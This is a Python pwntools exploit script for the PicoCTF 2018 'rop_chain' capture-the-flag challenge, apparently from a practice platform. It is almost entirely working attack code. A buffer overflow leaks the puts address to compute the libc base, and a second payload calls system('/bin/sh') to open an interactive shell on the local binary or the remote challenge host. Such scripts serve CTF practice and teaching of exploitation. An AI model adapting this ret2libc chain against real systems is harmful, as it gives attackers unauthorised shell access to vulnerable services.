import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_rop_chain')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_rop_chain')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25719)
			elf=ELF('./PicoCTF_2018_rop_chain')
			libc=ELF('../../i386libc/libc.so.6')


		bss_1=elf.bss()+0x200


		# gdb.attach(io)
		# pause()
		io.recv()
		pay='a'*0x1c+p32(elf.sym['puts'])+p32(0x080484D0)+p32(elf.got['puts'])
		io.sendline(pay)
		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		pay='a'*0x1c+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		io.sendline(pay)


		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue